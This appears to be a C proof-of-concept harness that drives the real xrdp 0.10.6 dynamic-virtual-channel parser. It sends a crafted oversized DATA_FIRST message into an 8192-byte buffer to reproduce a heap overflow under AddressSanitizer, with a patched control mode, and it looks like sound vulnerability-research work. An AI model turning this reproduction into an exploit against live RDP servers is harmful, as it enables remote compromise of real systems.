/*
 * real_drdynvc_driver.c -- drive the REAL compiled xrdp 0.10.6 DYNVC parse path
 * (libxrdp.a:xrdp_channel_process -> xrdp_channel_process_drdynvc ->
 * drdynvc_process_data_first) with a client-sized reassembled DYNVC_DATA_FIRST.
 *
 * The data_first callback reproduces the exact sink body of
 * xrdp/xrdp_mm.c:xrdp_mm_drdynvc_data_first() using the REAL libcommon
 * trans_create()/trans_get_out_s()/out_uint8a() functions, so ASan reports on
 * the real 8192-byte trans out buffer, not on a reimplementation.
 *
 * Build:
 *   cc -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer \
 *     -I<src>/libxrdp -I<src>/common -I<src>/include -I<build-asan> \
 *     real_drdynvc_driver.c <build-asan>/libxrdp/.libs/libxrdp.a \
 *     <build-asan>/common/.libs/libcommon.a -lssl -lcrypto -lpthread -ldl -lm \
 *     -o real_drdynvc_driver
 */
#include "libxrdp.h"
#include "xrdp_constants.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define DYNVC_CHAN 1
#define PAYLOAD_LEN 20000
#define FIXED_CAP 8192 - 64

static int g_fixed = 0;
static int g_callback_calls = 0;
static int g_last_bytes = -1;

/* Exact body of xrdp_mm_drdynvc_data_first(), with a benign cap when g_fixed. */
static int
sink_data_first(intptr_t id, int chan_id, char *data, int bytes, int total_bytes)
{
    struct trans *trans;
    struct stream *s;
    int copy_bytes = bytes;
    int chansrv_chan_id = 42; /* stands in for wm->mm->xr2cr_cid_map[chan_id] */

    g_callback_calls++;
    g_last_bytes = bytes;
    if (g_fixed && copy_bytes > FIXED_CAP)
    {
        copy_bytes = FIXED_CAP;
    }
    trans = trans_create(TRANS_MODE_UNIX, 8192, 8192);
    if (trans == NULL)
    {
        return 1;
    }
    s = trans_get_out_s(trans, 8192);
    if (s == NULL)
    {
        trans_delete(trans);
        return 1;
    }
    out_uint32_le(s, 0);                                  /* version */
    out_uint32_le(s, 8 + 8 + 4 + 4 + 4 + copy_bytes);     /* size */
    out_uint32_le(s, 17);                                 /* msg id 17 */
    out_uint32_le(s, 8 + 4 + 4 + 4 + copy_bytes);         /* size */
    out_uint32_le(s, chansrv_chan_id);
    out_uint32_le(s, copy_bytes);
    out_uint32_le(s, total_bytes);
    out_uint8a(s, data, copy_bytes);                      /* <-- the sink */
    s_mark_end(s);
    trans_write_copy(trans);
    trans_delete(trans);
    return 0;
}

/* Build one virtual-channel chunk: 8-byte CHANNEL_PDU_HEADER + payload. */
static void
make_chunk(struct stream *s, int total_length, int flags,
           const char *data, int len)
{
    init_stream(s, len + 16);
    out_uint32_le(s, total_length);
    out_uint32_le(s, flags);
    out_uint8a(s, data, len);
    s_mark_end(s);
    s->p = s->data;
}

int
main(int argc, char **argv)
{
    struct xrdp_channel chan;
    struct xrdp_mcs mcs;
    struct xrdp_sec sec;
    struct xrdp_rdp rdp;
    struct xrdp_session session;
    struct list *channel_list;
    struct mcs_channel_item item;
    struct stream *in_s;
    struct stream *body;
    char marker[64];
    int body_len;
    int total_length;
    int chunk1_len, chunk2_len;
    int payload_len;
    int declared_total;
    int i;
    int rv = 0;

    if (argc > 1 && strcmp(argv[1], "fixed") == 0)
    {
        g_fixed = 1;
    }

    /* Minimal real structs, zeroed; set only what the real code reads. */
    memset(&chan, 0, sizeof(chan));
    memset(&mcs, 0, sizeof(mcs));
    memset(&sec, 0, sizeof(sec));
    memset(&rdp, 0, sizeof(rdp));
    memset(&session, 0, sizeof(session));

    channel_list = list_create();
    memset(&item, 0, sizeof(item));
    strncpy(item.name, "drdynvc", CHANNEL_NAME_LEN);
    item.chanid = 1;
    item.disabled = 0;
    list_add_item(channel_list, (tintptr) &item);

    mcs.channel_list = channel_list;
    sec.rdp_layer = &rdp;
    rdp.session = &session;
    session.id = 1234;

    chan.sec_layer = &sec;
    chan.mcs_layer = &mcs;
    chan.drdynvc_channel_id = 0; /* channel_list index 0 == drdynvc */
    chan.drdynvcs[DYNVC_CHAN].data_first = sink_data_first;

    /* Reassembled DYNVC body: cmd byte (0x28 = DATA_FIRST, cbChId=0,
     * length-size bits=2 -> uint32 total_bytes), 1-byte chan id,
     * uint32 total_bytes, then PAYLOAD_LEN chosen bytes. */
    payload_len = (argc > 2) ? atoi(argv[2]) : PAYLOAD_LEN;
    declared_total = (argc > 3) ? atoi(argv[3]) : payload_len;
    body_len = 1 + 1 + 4 + payload_len;
    make_stream(body);
    init_stream(body, body_len);
    out_uint8(body, 0x28);
    out_uint8(body, DYNVC_CHAN);
    out_uint32_le(body, declared_total);
    for (i = 0; i < payload_len; i++)
    {
        out_uint8(body, (char) (i & 0xff));
    }
    s_mark_end(body);
    body->p = body->data;
    /* recognizable marker at the start of the chosen data */
    snprintf(marker, sizeof(marker), "XRDP2SHELL-CHOSEN-MARKER");
    memcpy(body->data + 6, marker, strlen(marker));

    total_length = body_len;
    make_stream(in_s);

    /* CHANNEL_FLAG_FIRST|LAST: the whole DYNVC message is in this one
     * virtual-channel PDU, so xrdp_channel_process_drdynvc() uses
     * ls = s directly and drdynvc_process_data_first() sees
     * bytes = s->end - s->p = PAYLOAD_LEN. */
    make_chunk(in_s, total_length, 3, body->data, body_len);
    rv = xrdp_channel_process(&chan, in_s, MCS_GLOBAL_CHANNEL + 1);
    printf("SINGLE rv=%d callback_calls=%d bytes_seen=%d fixed=%d\n",
           rv, g_callback_calls, g_last_bytes, g_fixed);

    printf("RESULT: %s\n", (!g_fixed && g_callback_calls == 1 &&
                           g_last_bytes == payload_len) ? "VULNERABLE_PATH_REACHED"
                          : (g_fixed ? "FIXED_CONTROL" : "UNEXPECTED"));
    return 0;
}
